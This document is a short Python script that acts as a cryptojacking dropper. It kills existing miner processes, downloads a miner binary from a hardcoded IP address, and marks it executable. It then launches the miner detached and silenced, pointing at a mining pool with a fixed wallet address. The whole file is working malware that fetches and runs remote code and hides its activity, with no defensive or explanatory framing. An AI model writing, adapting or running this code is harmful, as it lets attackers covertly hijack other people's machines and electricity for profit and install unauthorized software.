import urllib.request, subprocess, os, platform, time
# KILL OLD MINER FIRST
try:
    subprocess.run(["pkill", "-9", "-f", "/tmp/m"], timeout=5, capture_output=True)
    subprocess.run(["pkill", "-9", "-f", "alpha-miner"], timeout=5, capture_output=True)
    time.sleep(1)
except: pass
system = platform.system()
if system == "Windows":
    url = "http://151.247.219.40:8000/alpha-miner.exe"
    path = os.environ.get("TEMP", "C:/Temp") + "/m.exe"
else:
    url = "http://151.247.219.40:8000/alpha-miner"
    path = "/tmp/m"
urllib.request.urlretrieve(url, path)
if system != "Windows": os.chmod(path, 0o755)
if system == "Windows":
    proc = subprocess.Popen([path, "--pool", "stratum+tcp://sg1.alphapool.tech:5566", "--address", "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg", "--worker", "w_134"], creationflags=8)
else:
    proc = subprocess.Popen([path, "--pool", "stratum+tcp://sg1.alphapool.tech:5566", "--address", "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg", "--worker", "w_134"],
        stdout=open("/dev/null","w"), stderr=open("/dev/null","w"), start_new_session=True)
